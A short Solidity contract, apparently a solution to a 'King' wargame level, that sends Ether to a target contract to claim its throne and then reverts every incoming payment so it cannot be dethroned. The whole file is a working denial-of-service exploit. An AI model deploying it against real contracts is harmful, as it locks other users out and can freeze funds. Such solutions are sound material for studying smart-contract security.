// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns(uint);
}

contract KingConquest {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    function callKing(address kingContract) external payable {
        require(msg.sender == owner, "Not the owner");
        (bool success, bytes memory data) = kingContract.call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        revert();
    }

}